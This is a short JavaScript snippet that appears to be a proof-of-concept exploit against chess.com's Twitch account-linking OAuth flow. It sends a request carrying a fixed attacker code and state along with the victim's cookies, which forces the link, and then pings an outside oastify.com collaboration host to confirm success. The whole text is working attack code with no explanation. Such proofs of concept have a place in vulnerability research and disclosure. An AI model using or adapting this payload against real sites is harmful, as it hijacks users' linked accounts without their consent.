
var hackerCallbackUrl = "https://www.chess.com/twitch/connect?code=4jmjaa72a19vzr16e1674u1pbi9xfq&scope=user_read+viewing_activity_read+user_subscriptions&state=4e13c18a1af79282d354f443108f9fed"; 

fetch(hackerCallbackUrl, {
    method: 'GET',
    credentials: 'include' 
})
.then(response => {
    if (response.ok) {
        fetch("https://g0ht46bti8mfmyhnj3nivao8mzsqgi47.oastify.com/?impact=Twitch_Linked_Successfully");
    }
});
